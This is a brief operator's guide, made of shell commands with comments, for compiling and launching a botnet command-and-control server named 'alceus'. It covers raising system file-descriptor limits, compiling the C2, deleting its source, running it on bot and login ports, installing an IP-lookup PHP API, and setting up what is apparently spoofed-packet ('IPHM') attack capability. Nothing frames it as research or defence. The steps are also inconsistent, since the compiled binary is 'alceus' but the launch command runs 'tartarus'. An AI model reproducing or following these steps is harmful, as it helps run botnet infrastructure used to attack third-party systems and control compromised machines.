////////////////////////////////////
/Setting Up The C2 and Compiling it/
////////////////////////////////////

nano /usr/include/bits/typesizes.h      	         // Scroll down until you see || #define __FD_SETSIZE            1024    || change the "1024" to 1000000
ulimit -n 999999                         	        // Changing ULIMIT
nano alceus.c                                          // Go into the alceus.c and find the IPLOOKUP function, and change the IP within the function, this will fix the Lookup function!
gcc -o alceus alceus.c -pthread           	      // Compiles the c2
rm -rf alceus.c                                      // removes / Deletes the raw .c file for the c2
screen ./tartarus <botport> <threads> <screenport>    // Screens the C2 || botport = the changed selection inside of the bot, use the same number! || threads = threads we are using to screen the c2 on, set as a high number! can not go over 1000! || ScreenPort = The port we want to connect on, this will open the port and allow us to login to the C2 and Use it!
mv /root/iplookup.php /var/www/html                // Moving the IPGeolocation API into the HTML Directory!
cd /var/www/html && cat iplookup.php >> api.php   // Moving into HTML directory and catting/moving the code from <iplookup.php> into <api.php>
nano arc.py                                      // This is for the IPHM Installation for owner accounts!
